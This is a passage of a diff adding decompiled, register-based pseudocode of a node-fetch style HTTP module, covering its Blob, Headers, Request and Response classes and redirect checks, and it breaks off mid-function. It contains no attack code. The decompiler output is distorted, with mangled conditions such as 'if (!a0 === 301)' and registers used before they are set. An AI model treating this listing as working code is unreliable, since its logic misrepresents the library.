+	global_Kj = func_initializeQueueScope_0x1000005b2(func_diffAndMergeArray_0x1000005bf, r11, 1)
+	r7 = global_fi["object"]
+	r9 = new {"root": null, "meta": null}
+	r9["root"] = global_fi["string"]()
+	r10 = global_fi["record"]
+	r12 = global_fi["string"]()
+	r13 = global_fi["string"]()
+	r9["meta"] = r10(r12, r13)
+	global_Uj = r7(r9)
+	return undefined
+}
+function func_initializeFetchModule_0x100006ba6(a0, a1)
+{
+	Scope[5355][140] = func_createTypedError_0x100006a17
+	Scope[5355][144] = func_FetchBody_0x100006a1b
+	Scope[5355][145] = func_consumeBody_0x100006a33
+	Scope[5355][146] = func_textConverted_0x100006a35
+	Scope[5355][147] = func_isURLSearchParams_0x100006a37
+	Scope[5355][148] = func_isBlobLike_0x100006a39
+	Scope[5355][149] = func_cloneBody_0x100006a3b
+	Scope[5355][150] = func_extractContentType_0x100006a3d
+	Scope[5355][151] = func_getBodyLength_0x100006a3f
+	Scope[5355][152] = func_pipeRequestBody_0x100006a41
+	Scope[5355][155] = func_validateHeaderName_0x100006a43
+	Scope[5355][156] = func_validateHttpHeaderValue_0x100006a45
+	Scope[5355][157] = func_getHeaderValue_0x100006a47
+	Scope[5355][160] = func_normalizeHeaders_0x100006a4f
+	Scope[5355][162] = func_createIteratorResult_0x100006a51
+	Scope[5355][164] = func_normalizeHeaders_0x100006a53
+	Scope[5355][165] = func_buildHeadersMap_0x100006a55
+	Scope[5355][173] = func_normalizeUrlScheme_0x100006a57
+	Scope[5355][175] = func_isAsyncIterable_0x100006a59
+	Scope[5355][176] = func_isAbortSignal_0x100006a5b
+	Scope[5355][178] = func_buildFetchOptions_0x100006a5d
+	Scope[5355][179] = func_initAbortError_0x100006a5f
+	Scope[5355][180] = func_mu_0x100006a60
+	Scope[5355][184] = func_initFetchRequest_0x100006ac2
+	r5 = Object["defineProperty"]
+	r8 = "__esModule"
+	r9 = new {"value": <true}
+	ACCU = r5(a0, r8, r9)
+	r8 = require("stream")
+	Scope[5355][132] = func_getDefault_0x100006a15(r8)
+	r8 = require("http")
+	Scope[5355][133] = func_getDefault_0x100006a15(r8)
+	r8 = require("url")
+	r2 = func_getDefault_0x100006a15(r8)
+	r8 = func_assignUrlExports_0x100006a02["exports"]()
+	r3 = func_getDefault_0x100006a15(r8)
+	r8 = require("https")
+	Scope[5355][134] = func_getDefault_0x100006a15(r8)
+	r8 = require("zlib")
+	Scope[5355][135] = func_getDefault_0x100006a15(r8)
+	Scope[5355][136] = Scope[5355][132]["Readable"]
+	Scope[5355][137] = Symbol("buffer")
+	Scope[5355][138] = Symbol("type")
+	ACCU = ToName("size")
+	ACCU = ToName("type")
+	ACCU = ToName("text")
+	ACCU = ToName("arrayBuffer")
+	ACCU = ToName("stream")
+	ACCU = ToName("toString")
+	ACCU = ToName("slice")
+	r7 = DefineClass([17, <DescriptorArray[4], <NumberDictionary[7], [], <NameDictionary[53], <NumberDictionary[52], [13, 21, 28, 36, 44, 52, 60]], func_initBlob_0x100006b41, null, "XR6@", func_getBlobSize_0x100006b43, ")Lyh", func_getBlobType_0x100006b44, "O9*f", func_blobToText_0x100006b46, ")Lyh", func_blobToArrayBuffer_0x100006b48, func_mu_0x100006a60, func_createReadableStream_0x100006b4b, "]1@2", func_toBlobString_0x100006b4d, func_mu_0x100006a60, func_sliceBlob_0x100006b4f)
+	Scope[5356][2] = func_initBlob_0x100006b41
+	Scope[5355][139] = func_initBlob_0x100006b41
+	r5 = Object["defineProperties"]
+	r7 = Scope[5355][139]["prototype"]
+	r8 = new {"size": {"enumerable": <true}, "type": {"enumerable": <true}, "slice": {"enumerable": <true}}
+	ACCU = r5(r7, r8)
+	r5 = Object["defineProperty"]
+	r7 = Scope[5355][139]["prototype"]
+	r8 = Symbol["toStringTag"]
+	r9 = new {"value": null, "writable": <false, "enumerable": <false, "configurable": <true}
+	r9["value"] = "Blob"
+	ACCU = r5(r7, r8, r9)
+	r7 = Object["create"]
+	r9 = Error["prototype"]
+	Scope[5355][140]["prototype"] = r7(r9)
+	r5 = Scope[5355][140]["prototype"]
+	r5["constructor"] = func_createTypedError_0x100006a17
+	r5 = Scope[5355][140]["prototype"]
+	r6 = "name"
+	r5[r6] = "FetchError"
+	try
+	{
+		r6 = func_initializeIconvModule_0x100006a13["exports"]()
+		Scope[5355][141] = r6["convert"]
+	}
+	catch
+	{
+		ACCU = null
+		ACCU = Scope[5355]
+	}
+	r8 = "Body internals"
+	Scope[5355][142] = Symbol(r8)
+	Scope[5355][143] = Scope[5355][132]["PassThrough"]
+	r6 = "prototype"
+	ACCU = DefineAccessorPropertyUnchecked(r8, "body", func_getBodyFromState_0x100006b69, null, 0)
+	ACCU = DefineAccessorPropertyUnchecked(r8, "bodyUsed", func_getBodyUsedFromState_0x100006b6b, null, 0)
+	Scope[5355][144][r6] = r8
+	r5 = Object["defineProperties"]
+	r7 = Scope[5355][144]["prototype"]
+	r8 = new {"body": {"enumerable": <true}, "bodyUsed": {"enumerable": <true}, "arrayBuffer": {"enumerable": <true}, "blob": {"enumerable": <true}, "json": {"enumerable": <true}, "text": {"enumerable": <true}}
+	ACCU = r5(r7, r8)
+	Scope[5355][144]["mixIn"] = func_applyPrototypeProperties_0x100006b6d
+	Scope[5355][144]["Promise"] = global["Promise"]
+	Scope[5355][153] = \[^\\\\^_`a-zA-Z\\\\-0-9!#$%&'*+.|~]\
+	Scope[5355][154] = \[^\\\\t\\\\x20-\\\\x7e\\\\x80-\\\\xff]\
+	Scope[5355][158] = Symbol("map")
+	ACCU = ToName("get")
+	ACCU = ToName("forEach")
+	ACCU = ToName("set")
+	ACCU = ToName("append")
+	ACCU = ToName("has")
+	ACCU = ToName("delete")
+	ACCU = ToName("raw")
+	ACCU = ToName("keys")
+	ACCU = ToName("values")
+	ACCU = ToName(Symbol["iterator"])
+	r7 = DefineClass([23, <DescriptorArray[4], <NumberDictionary[7], [], <NameDictionary[53], <NumberDictionary[52], [12, 20, 28, 36, 44, 52, 60, 68, 76, 84]], func_initHeaders_0x100006b6f, null, "xQ)2", func_getHeader_0x100006b71, "gm42", func_defineTypeExtensions_0x100006b73, "K&pk", func_setHeader_0x100006b75, "m[K#", func_appendHeader_0x100006b77, "A5nh", func_hasHeader_0x100006b79, "pdVE", func_deleteHeader_0x100006b7b, "O9*f", func_getRawHeaders_0x100006b7c, "B@Sb", func_iterateKeys_0x100006b7e, "h^gm", func_iterateValues_0x100006b80, "K&pk", func_iterateEntries_0x100006b82)
+	Scope[5357][2] = func_initHeaders_0x100006b6f
+	Scope[5355][159] = func_initHeaders_0x100006b6f
+	r5 = Scope[5355][159]["prototype"]
+	r7 = Scope[5355][159]["prototype"]
+	r5["entries"] = r7[Symbol["iterator"]]
+	r5 = Object["defineProperty"]
+	r7 = Scope[5355][159]["prototype"]
+	r8 = Symbol["toStringTag"]
+	r9 = new {"value": null, "writable": <false, "enumerable": <false, "configurable": <true}
+	r9["value"] = "Headers"
+	ACCU = r5(r7, r8, r9)
+	r5 = Object["defineProperties"]
+	r7 = Scope[5355][159]["prototype"]
+	r8 = new {"get": {"enumerable": <true}, "forEach": {"enumerable": <true}, "set": {"enumerable": <true}, "append": {"enumerable": <true}, "has": {"enumerable": <true}, "delete": {"enumerable": <true}, "keys": {"enumerable": <true}, "values": {"enumerable": <true}, "entries": {"enumerable": <true}}
+	ACCU = r5(r7, r8)
+	Scope[5355][161] = Symbol("internal")
+	r5 = Object["setPrototypeOf"]
+	r7 = new {"next": null}
+	r7["next"] = func_headersIteratorNext_0x100006b84
+	r8 = Object["getPrototypeOf"]
+	r10 = Object["getPrototypeOf"]
+	r13 = []
+	r12 = r13[Symbol["iterator"]]
+	r12 = r12()
+	r10 = r10(r12)
+	r8 = r8(r10)
+	Scope[5355][163] = r5(r7, r8)
+	r5 = Object["defineProperty"]
+	r8 = Symbol["toStringTag"]
+	r9 = new {"value": null, "writable": <false, "enumerable": <false, "configurable": <true}
+	r9["value"] = "HeadersIterator"
+	ACCU = r5(Scope[5355][163], r8, r9)
+	Scope[5355][166] = Symbol("Response internals")
+	Scope[5355][167] = Scope[5355][133]["STATUS_CODES"]
+	ACCU = ToName("url")
+	ACCU = ToName("status")
+	ACCU = ToName("redirected")
+	ACCU = ToName("statusText")
+	ACCU = ToName("headers")
+	ACCU = ToName("clone")
+	r7 = DefineClass([16, <DescriptorArray[4], <NumberDictionary[7], [], <NameDictionary[53], <NumberDictionary[52], [13, 21, 33, 41, 49, 56]], func_initResponse_0x100006b86, null, "]C&)", func_getResponseUrl_0x100006b88, "toM2", func_getResponseStatus_0x100006b8a, func_isResponseOkScope_0x100006b8c, 117455, func_hasActiveConnections_0x100006b8e, func_mu_0x100006a60, func_getStatusText_0x100006b90, func_mu_0x100006a60, func_getResponseHeaders_0x100006b92, "Yx9u", func_cloneResponse_0x100006b94)
+	Scope[5358][2] = func_initResponse_0x100006b86
+	Scope[5355][168] = func_initResponse_0x100006b86
+	r5 = Scope[5355][144]["mixIn"]
+	ACCU = r5(Scope[5355][168]["prototype"])
+	r5 = Object["defineProperties"]
+	r7 = Scope[5355][168]["prototype"]
+	r8 = new {"url": {"enumerable": <true}, "status": {"enumerable": <true}, "ok": {"enumerable": <true}, "redirected": {"enumerable": <true}, "statusText": {"enumerable": <true}, "headers": {"enumerable": <true}, "clone": {"enumerable": <true}}
+	ACCU = r5(r7, r8)
+	r5 = Object["defineProperty"]
+	r7 = Scope[5355][168]["prototype"]
+	r8 = Symbol["toStringTag"]
+	r9 = new {"value": null, "writable": <false, "enumerable": <false, "configurable": <true}
+	r9["value"] = "Response"
+	ACCU = r5(r7, r8, r9)
+	Scope[5355][169] = Symbol("Request internals")
+	ACCU = r2["URL"]
+	if (!r2["URL"])
+	{
+		ACCU = r3["URL"]
+	}
+	Scope[5355][170] = ACCU
+	Scope[5355][171] = r2["parse"]
+	Scope[5355][172] = r2["format"]
+	r8 = Scope[5355][132]["Readable"]["prototype"]
+	Scope[5355][174] = "destroy" in r8
+	ACCU = ToName("method")
+	ACCU = ToName("url")
+	ACCU = ToName("headers")
+	ACCU = ToName("redirect")
+	ACCU = ToName("signal")
+	ACCU = ToName("clone")
+	r7 = DefineClass([15, <DescriptorArray[4], <NumberDictionary[7], [], <NameDictionary[53], <NumberDictionary[52], [13, 21, 29, 37, 45, 52]], func_initRequest_0x100006b96, null, func_mu_0x100006a60, func_getRequestMethod_0x100006b98, "vV[N", func_getParsedUrl_0x100006b9a, "xQ)2", func_getRequestHeaders_0x100006b9c, "9pb7", func_getRedirectMode_0x100006b9e, func_mu_0x100006a60, func_getSignal_0x100006ba0, "pdVE", func_initRequest_0x100006ba1)
+	Scope[5359][2] = func_initRequest_0x100006b96
+	Scope[5355][177] = func_initRequest_0x100006b96
+	r5 = Scope[5355][144]["mixIn"]
+	ACCU = r5(Scope[5355][177]["prototype"])
+	r5 = Object["defineProperty"]
+	r7 = Scope[5355][177]["prototype"]
+	r8 = Symbol["toStringTag"]
+	r9 = new {"value": null, "writable": <false, "enumerable": <false, "configurable": <true}
+	r9["value"] = "Request"
+	ACCU = r5(r7, r8, r9)
+	r5 = Object["defineProperties"]
+	r7 = Scope[5355][177]["prototype"]
+	r8 = new {"method": {"enumerable": <true}, "url": {"enumerable": <true}, "headers": {"enumerable": <true}, "redirect": {"enumerable": <true}, "clone": {"enumerable": <true}, "signal": {"enumerable": <true}}
+	ACCU = r5(r7, r8)
+	r7 = Object["create"]
+	r9 = Error["prototype"]
+	Scope[5355][179]["prototype"] = r7(r9)
+	r5 = Scope[5355][179]["prototype"]
+	r5["constructor"] = func_initAbortError_0x100006a5f
+	r5 = Scope[5355][179]["prototype"]
+	r5["name"] = "AbortError"
+	ACCU = r2["URL"]
+	if (!r2["URL"])
+	{
+		ACCU = r3["URL"]
+	}
+	Scope[5355][181] = ACCU
+	Scope[5355][182] = Scope[5355][132]["PassThrough"]
+	Scope[5355][183] = func_isSameDomain_0x100006ba3
+	Scope[5355][184]["isRedirect"] = func_isRedirectStatus_0x100006ba5
+	Scope[5355][184]["Promise"] = global["Promise"]
+	a1["exports"] = func_initFetchRequest_0x100006ac2
+	r5 = Object["defineProperty"]
+	r8 = "__esModule"
+	r9 = new {"value": <true}
+	ACCU = r5(func_initFetchRequest_0x100006ac2, r8, r9)
+	Scope[5355][184]["default"] = func_initFetchRequest_0x100006ac2
+	Scope[5355][184]["Headers"] = func_initHeaders_0x100006b6f
+	Scope[5355][184]["Request"] = func_initRequest_0x100006b96
+	Scope[5355][184]["Response"] = func_initResponse_0x100006b86
+	Scope[5355][184]["FetchError"] = func_createTypedError_0x100006a17
+	return undefined
+}
+function func_isRedirectStatus_0x100006ba5(a0)
+{
+	ACCU = a0 === 301
+	if (!a0 === 301)
+	{
+		ACCU = a0 === 302
+		if (!a0 === 302)
+		{
+			if (!a0 === 303)
+			{
+				if (!a0 === 307)
+				{
+					ACCU = a0 === 308
+				}
+			}
+		}
+	}
+	return ACCU
+}
+function func_isSameDomain_0x100006ba3(a0, a1)
+{
+	ACCU = Scope[5355][181]
+	r3 = Scope[5355][181](r1)
+	r0 = r3["hostname"]
+	ACCU = Scope[5355][181]
+	r3 = Scope[5355][181](r0)
+	r1 = r3["hostname"]
+	ACCU = r0 === r1
+	if (!r0 === r1)
+	{
+		r10 = r0["length"]
+		r8 = (r10 - r1["length"])
+		r5 = r0[(r8 - 1)]
+		ACCU = r5 === "."
+		if (r5 === ".")
+		{
+			ACCU = r0["endsWith"](r1)
+		}
+	}
+	return ACCU
+}
+function func_initRequest_0x100006ba1()
+{
+	ACCU = func_initRequest_0x100006b96
+	return func_initRequest_0x100006b96(<this>)
+}
+function func_getSignal_0x100006ba0()
+{
+	return <this>[Scope[5355][169]]["signal"]
+}
+function func_getRedirectMode_0x100006b9e()
+{
+	return <this>[Scope[5355][169]]["redirect"]
+}
+function func_getRequestHeaders_0x100006b9c()
+{
+	return <this>[Scope[5355][169]]["headers"]
+}
+function func_getParsedUrl_0x100006b9a()
+{
+	r5 = <this>[Scope[5355][169]]["parsedURL"]
+	return Scope[5355][172](r5)
+}
+function func_getRequestMethod_0x100006b98()
+{
+	return <this>[Scope[5355][169]]["method"]
+}
+function func_initRequest_0x100006b96(a0)
+{
+	r7 = unmapped(a0)
+	if (r7["length"] > 1)
+	r11 = r7[1]
+	r12 = undefined
+		&& (!(r11 === r12))
+	{
+		ACCU = r7[1]
+	}
+	else
+	{
+	}
+	r1 = {}
+	r2 = undefined
+	if (func_isAsyncIterable_0x100006a59(a0))
+	{
+		r12 = a0["url"]
+		r2 = func_normalizeUrlScheme_0x100006a57(r12)
+	}
+	else
+	{
+		if (a0)
+			&& (a0["href"])
+		{
+			r12 = a0["href"]
+			r2 = func_normalizeUrlScheme_0x100006a57(r12)
+		}
+		else
+		{
+			r9 = func_callWithArg_0x100006b14
+			r2 = r9(func_normalizeUrlScheme_0x100006a57, ("" + a0))
+		}
+		a0 = {}
+	}
+	ACCU = r1["method"]
+	if (!r1["method"])
+	{
+		ACCU = a0["method"]
+		if (!a0["method"])
+		{
+			ACCU = "GET"
+		}
+	}
+	r3 = ACCU
+	r9 = r3["toUpperCase"]
+	r3 = r9()
+	if (!(r1["body"] == null))
+		|| (func_isAsyncIterable_0x100006a59(a0))
+		&& (!(a0["body"] === null))
+	{
+		if (r3 === "GET")
+		r12 = "HEAD"
+			|| (r3 === r12)
+		{
+			r10 = "Request with GET/HEAD method cannot have body"
+			ACCU = TypeError
+			ACCU = TypeError(r10)
+		}
+	}
+	r11 = r1["body"]
+	ACCU = !(r11 == null)
+	if (!(r11 == null))
+	{
+		ACCU = r1["body"]
+	}
+	else
+	{
+		if (func_isAsyncIterable_0x100006a59(a0))
+		r11 = a0["body"]
+		ACCU = !(r11 === null)
+			&& (!(r11 === null))
+		{
+			ACCU = func_cloneBody_0x100006a3b(a0)
+		}
+		else
+		{
+			ACCU = null
+		}
+	}
+	r4 = ACCU
+	r9 = Scope[5355][144]["call"]
+	r13 = new {"timeout": null, "size": null}
+	ACCU = r1["timeout"]
+	r12 = r4
+	if (!r1["timeout"])
+	{
+		ACCU = a0["timeout"]
+		if (!a0["timeout"])
+		{
+			ACCU = 0
+		}
+	}
+	r13["timeout"] = ACCU
+	ACCU = r1["size"]
+	if (!r1["size"])
+	{
+		ACCU = a0["size"]
+		if (!a0["size"])
+		{
+			ACCU = 0
+		}
+	}
+	r13["size"] = ACCU
+	ACCU = r9(<this>, r12, r13)
+	if (!r1["headers"])
+	{
+		if (!a0["headers"])
+		{
+		}
+	}
+	r10 = {}
+	ACCU = func_initHeaders_0x100006b6f
+	r5 = func_initHeaders_0x100006b6f(r10)
+	if (!(r4 == null))
+	{
+		r9 = r5["has"]
+		r11 = "Content-Type"
+		if (!r9(r11))
+		{
+			r8 = func_extractContentType_0x100006a3d(r4)
+			if (func_extractContentType_0x100006a3d(r4))
+			{
+				r9 = r5["append"]
+				r11 = "Content-Type"
+				ACCU = r9(r11, r8)
+			}
+		}
+	}
+	ACCU = func_isAsyncIterable_0x100006a59(a0)
+	if (func_isAsyncIterable_0x100006a59(a0))
+	{
+		ACCU = a0["signal"]
+	}
+	else
+	{
+		ACCU = null
+	}
+	r6 = ACCU
+	if ("signal" in r1)
+	{
+		r6 = r1["signal"]
+	}
+	if (!(r6 == null))
+	{
+		if (!func_isAbortSignal_0x100006a5b(r6))
+		{
+			r10 = "Expected signal to be an instanceof AbortSignal"
+			ACCU = TypeError
+			ACCU = TypeError(r10)
+		}
+	}
+	r11 = new {"method": null, "redirect": null, "headers": null, "parsedURL": null, "signal": null}
+	r11["method"] = r3
+	ACCU = r1["redirect"]
+	if (!r1["redirect"])
+	{
+		ACCU = a0["redirect"]
+		if (!a0["redirect"])
+		{
+			ACCU = "follow"
+		}
+	}
+	r11["redirect"] = ACCU
+	r11["headers"] = r5
+	r11["parsedURL"] = r2
+	r11["signal"] = r6
+	<this>[Scope[5355][169]] = r11
+	r10 = "follow"
+	r13 = r1["follow"]
+	r14 = undefined
+	ACCU = !(r13 === r14)
+	if (!(r13 === r14))
+	{
+		ACCU = r1["follow"]
+	}
+	else
+	{
+		r13 = a0["follow"]
+		r14 = undefined
+		ACCU = !(r13 === r14)
+		if (!(r13 === r14))
+		{
+			ACCU = a0["follow"]
+		}
+		else
+		{
+			ACCU = 20
+		}
+	}
+	<this>[r10] = ACCU
+	r10 = "compress"
+	r13 = r1["compress"]
+	r14 = undefined
+	ACCU = !(r13 === r14)
+	if (!(r13 === r14))
+	{
+		ACCU = r1["compress"]
+	}
+	else
+	{
+		r13 = a0["compress"]
+		r14 = undefined
+		ACCU = !(r13 === r14)
+		if (!(r13 === r14))
+		{
+			ACCU = a0["compress"]
+		}
+		else
+		{
+			ACCU = true
+		}
+	}
+	<this>[r10] = ACCU
+	r10 = "counter"
+	ACCU = r1["counter"]
+	if (!r1["counter"])
+	{
+		ACCU = a0["counter"]
+		if (!a0["counter"])
+		{
+			ACCU = 0
+		}
+	}
+	<this>[r10] = ACCU
+	r10 = "agent"
+	ACCU = r1["agent"]
+	if (!r1["agent"])
+	{
+		ACCU = a0["agent"]
+	}
+	<this>[r10] = ACCU
+	return undefined
+}
+function func_cloneResponse_0x100006b94()
+{
+	r3 = func_cloneBody_0x100006a3b(<this>)
+	r4 = new {"url": null, "status": null, "statusText": null, "headers": null, "ok": null, "redirected": null}
+	r4["url"] = <this>["url"]
+	r4["status"] = <this>["status"]
+	r4["statusText"] = <this>["statusText"]
+	r4["headers"] = <this>["headers"]
+	r4["ok"] = <this>["ok"]
+	r4["redirected"] = <this>["redirected"]
+	ACCU = func_initResponse_0x100006b86
+	return func_initResponse_0x100006b86(r3, r4)
+}
+function func_getResponseHeaders_0x100006b92()
+{
+	return <this>[Scope[5355][166]]["headers"]
+}
+function func_getStatusText_0x100006b90()
+{
+	return <this>[Scope[5355][166]]["statusText"]
+}
+function func_hasActiveConnections_0x100006b8e()
+{
+	r3 = <this>[Scope[5355][166]]["counter"]
+	return r3 > 0
+}
+function func_isResponseOkScope_0x100006b8c()
+{
+	r3 = <this>[Scope[5355][166]]["status"]
+	ACCU = r3 >= 200
+	if (r3 >= 200)
+	{
+		r3 = <this>[Scope[5355][166]]["status"]
+		ACCU = r3 < 300
+	}
+	return ACCU
+}
+function func_getResponseStatus_0x100006b8a()
+{
+	return <this>[Scope[5355][166]]["status"]
+}
+function func_getResponseUrl_0x100006b88()
+{
+	ACCU = <this>[Scope[5355][166]]["url"]
+	if (!<this>[Scope[5355][166]]["url"])
+	{
+		ACCU = ""
+	}
+	return ACCU
+}
+function func_initResponse_0x100006b86()
+{
+	r5 = unmapped(a0)
+	if (r5["length"] > 0)
+	r9 = r5[0]
+	r10 = undefined
+	ACCU = !(r9 === r10)
+		&& (!(r9 === r10))
+	{
+		ACCU = r5[0]
+	}
+	else
+	{
+		ACCU = null
+	}
+	r0 = ACCU
+	if (r5["length"] > 1)
+	r9 = r5[1]
+		&& (!(r9 === undefined))
+	{
+		ACCU = r5[1]
+	}
+	else
+	{
+	}
+	r1 = {}
+	r7 = Scope[5355][144]["call"]
+	ACCU = r7(<this>, r0, r1)
+	ACCU = r1["status"]
+	if (!r1["status"])
+	{
+		ACCU = 200
+	}
+	r3 = ACCU
+	r8 = r1["headers"]
+	ACCU = func_initHeaders_0x100006b6f
+	r4 = func_initHeaders_0x100006b6f(r8)
+	if (!(r0 == null))
+	{
+		r7 = r4["has"]
+		r9 = "Content-Type"
+		if (!r7(r9))
+		{
+			r6 = func_extractContentType_0x100006a3d(r0)
+			if (func_extractContentType_0x100006a3d(r0))
+			{
+				r7 = r4["append"]
+				r9 = "Content-Type"
+				ACCU = r7(r9, r6)
+			}
+		}
+	}
+	r9 = new {"url": null, "status": null, "statusText": null, "headers": null, "counter": null}
+	r9["url"] = r1["url"]
+	r9["status"] = r3
+	ACCU = r1["statusText"]
+	if (!r1["statusText"])
+	{
+		ACCU = Scope[5355][167][r3]
+	}
+	r9["statusText"] = ACCU
+	r9["headers"] = r4
+	r9["counter"] = r1["counter"]
+	<this>[Scope[5355][166]] = r9
+	return undefined
+}
+function func_headersIteratorNext_0x100006b84()
+{
+	if (!<this>)
+	r9 = Object["getPrototypeOf"]
+	r9 = r9(<this>)
+		|| (!(r9 === Scope[5355][163]))
+	{
+		ACCU = TypeError
+		ACCU = TypeError("Value of `this` is not a HeadersIterator")
+	}
+	r2 = <this>[Scope[5355][161]]["target"]
+	r3 = <this>[Scope[5355][161]]["kind"]
+	r4 = <this>[Scope[5355][161]]["index"]
+	r5 = func_normalizeHeaders_0x100006a4f(r2, r3)
+	r6 = r5["length"]
+	ACCU = r4 >= r6
+	if (r4 >= r6)
+	{
+		r7 = new {"value": null, "done": <true}
+		r7["value"] = undefined
+		ACCU = r7
+	}
+	else
+	{
+		<this>[Scope[5355][161]]["index"] = (r4 + 1)
+		r7 = new {"value": null, "done": <false}
+		r7["value"] = r5[r4]
+		ACCU = r7
+	}
+	return ACCU
+}
+function func_iterateEntries_0x100006b82()
+{
+	return func_createIteratorResult_0x100006a51(<this>, "key+value")
+}
+function func_iterateValues_0x100006b80()
+{
+	return func_createIteratorResult_0x100006a51(<this>, "value")
+}
+function func_iterateKeys_0x100006b7e()
+{
+	return func_createIteratorResult_0x100006a51(<this>, "key")
+}
+function func_getRawHeaders_0x100006b7c()
+{
+	return <this>[Scope[5355][158]]
+}
+function func_deleteHeader_0x100006b7b(a0)
+{
+	ACCU = func_applyFunction_0x100006b06(func_validateHeaderName_0x100006a43, ("" + a0))
+	r1 = func_callWithTwoArgs_0x100006ad9(func_getHeaderValue_0x100006a47, <this>[Scope[5355][158]], ("" + a0))
+	if (!(r1 === undefined))
+	{
+		delete r1[<this>[Scope[5355][158]]]
+	}
+	return undefined
+}
+function func_hasHeader_0x100006b79(a0)
+{
+	ACCU = func_applyFunction_0x100006b04(func_validateHeaderName_0x100006a43, ("" + a0))
+	r4 = func_callWithArgs_0x100006b05(func_getHeaderValue_0x100006a47, <this>[Scope[5355][158]], ("" + a0))
+	return !(r4 === undefined)
+}
+function func_appendHeader_0x100006b77(a0, a1)
+{
+	ACCU = func_applyFunction_0x100006b02(func_validateHeaderName_0x100006a43, ("" + a0))
+	ACCU = func_applyCallback_0x100006b03(func_validateHttpHeaderValue_0x100006a45, ("" + a1))
+	r3 = func_callWithArgs_0x100006adb
+	r0 = r3(func_getHeaderValue_0x100006a47, <this>[Scope[5355][158]], ("" + a0))
+	r6 = undefined
+	if (!(r0 === r6))
+	{
+		r3 = <this>[Scope[5355][158]][r0]["push"]
+		ACCU = r3(("" + a1))
+	}
+	else
+	{
+		r6 = new [0]
+		r6[0] = ("" + a1)
+		<this>[Scope[5355][158]][("" + a0)] = r6
+		ACCU = r6
+	}
+	return undefined
+}
+function func_setHeader_0x100006b75(a0, a1)
+{
+	ACCU = func_applyFunction_0x100006b00(func_validateHeaderName_0x100006a43, ("" + a0))
+	ACCU = func_callPredicate_0x100006add(func_validateHttpHeaderValue_0x100006a45, ("" + a1))
+	r1 = func_callWithArgs_0x100006adb(func_getHeaderValue_0x100006a47, <this>[Scope[5355][158]], ("" + a0))
+	r7 = undefined
+	ACCU = !(r1 === r7)
+	if (!(r1 === r7))
+	{
+		ACCU = r1
+	}
+	else
+	{
+		ACCU = ("" + a0)
+	}
+	r4 = ACCU
+	r6 = new [0]
+	r6[0] = ("" + a1)
+	<this>[Scope[5355][158]][r4] = r6
+	return undefined
+}
+function func_defineTypeExtensions_0x100006b73(a0)
+{
+	r5 = unmapped(a0)
+	if (r5["length"] > 1)
+	r10 = r5[1]
+	r11 = undefined
+	ACCU = !(r10 === r11)
+		&& (!(r10 === r11))
+	{
+		ACCU = r5[1]
+	}
+	else
+	{
+		ACCU = undefined
+	}
+	r0 = ACCU
+	r1 = func_normalizeHeaders_0x100006a4f(<this>)
+	r2 = 0
+	while (true)
+	{
+		r11 = r1["length"]
+		if (!r2 < r11) break
+		r4 = r1[r2]
+		r6 = r4[0]
+		r7 = r4[1]
+		r8 = a0["call"]
+		r9 = a0
+		r10 = r0
+		r11 = r7
+		r12 = r6
+		ACCU = r8(r10, r11, r12, <this>)
+		r1 = func_normalizeHeaders_0x100006a4f(<this>)
+		r2 = (r2 + 1)
+	}
+	return undefined
+}
+function func_getHeader_0x100006b71(a0)
+{
+	ACCU = func_applyFunction_0x100006ad5(func_validateHeaderName_0x100006a43, ("" + a0))
+	r2 = func_callWithArgs_0x100006adb
+	r1 = r2(func_getHeaderValue_0x100006a47, <this>[Scope[5355][158]], ("" + a0))
+	r5 = undefined
+	ACCU = r1 === r5
+	if (r1 === r5)
+	{
+		ACCU = null
+	}
+	else
+	{
+		r2 = <this>[Scope[5355][158]][r1]["join"]
+		ACCU = r2(", ")
+	}
+	return ACCU
+}
+function func_initHeaders_0x100006b6f()
+{
+	r7 = unmapped(a0)
+	if (r7["length"] > 0)
+	r26 = r7[0]
+	r27 = undefined
+	ACCU = !(r26 === r27)
+		&& (!(r26 === r27))
+	{
+		ACCU = r7[0]
+	}
+	else
+	{
+		ACCU = undefined
+	}
+	r1 = ACCU
+	r26 = Object["create"]
+	<this>[Scope[5355][158]] = r26(null)
+	r25 = Scope[5355][131]
+	if (r1 instanceof func_initHeaders_0x100006b6f)
+	{
+		r24 = r1["raw"]
+		r17 = r24()
+		r28 = 38424
+		r24 = Object["keys"]
+		r18 = r24(r17)
+		r25 = GetIterator(r18)
+		r24 = r25["next"]
+		ACCU = false
+		r26 = false
+		try
+		{
+			while (true)
+			{
+				r26 = true
+				r30 = r24()
+				if (r30["done"]) break
+				r26 = false
+				r20 = r30["value"]
+				r33 = r17[r30["value"]]
+				r30 = r30["value"]
+				r32 = GetIterator(r33)
+				r31 = r32["next"]
+				ACCU = false
+				r33 = false
+				try
+				{
+					while (true)
+					{
+						r33 = true
+						r37 = r31()
+						if (r37["done"]) break
+						r33 = false
+						ACCU = <this>["append"](r20, r37["value"])
+						r37 = r37["value"]
+					}
+					ACCU = -1
+					r35 = -1
+					r34 = -1
+				}
+				catch
+				{
+					r35 = ACCU
+					r34 = 0
+				}
+				if (!r33)
+				{
+					try
+					{
+						if (!r32["return"] == undefined)
+						{
+							ACCU = r32["return"]()
+						}
+						catch {}
+					}
+				}
+				ACCU = null
+				if (!r34 === 0) continue
+				ACCU = 0
+				r27 = 0
+				r28 = r35
+				break
+			}
+			ACCU = -1
+			r28 = -1
+			r27 = -1
+		}
+		catch
+		{
+			r28 = ACCU
+			r27 = 0
+		}
+		if (!r26)
+		{
+			r31 = Scope[5371]
+			try
+			{
+				if (!r25["return"] == undefined)
+				{
+					ACCU = r25["return"]()
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r27 === 0)
+		{
+			ACCU = r28
+		}
+		return undefined
+	}
+	if (!(r1 == null))
+	{
+		r26 = TypeOf(r1)
+		r27 = "object"
+		if (r26 == r27)
+		{
+			r8 = r1[Symbol["iterator"]]
+			r25 = Scope[5355][131]
+			if (!(r8 == null))
+			{
+				r28 = 28365
+				r26 = TypeOf(r8)
+				r27 = "function"
+				if (!(r26 == r27))
+				{
+					r28 = 80599
+					r25 = "Header pairs must be iterable"
+					ACCU = TypeError
+					ACCU = TypeError(r25)
+				}
+				r12 = []
+				r25 = GetIterator(r1)
+				r24 = r25["next"]
+				ACCU = false
+				r26 = false
+				try
+				{
+					while (true)
+					{
+						r26 = true
+						r30 = r24()
+						if (r30["done"]) break
+						r26 = false
+						r16 = r30["value"]
+						r33 = TypeOf(r30["value"])
+						r34 = "object"
+						r30 = r30["value"]
+						if (!(r33 == r34))
+						r33 = TypeOf(r16[Symbol["iterator"]])
+						r34 = "function"
+							|| (!(r33 == r34))
+						{
+							r32 = "Each header pair must be iterable"
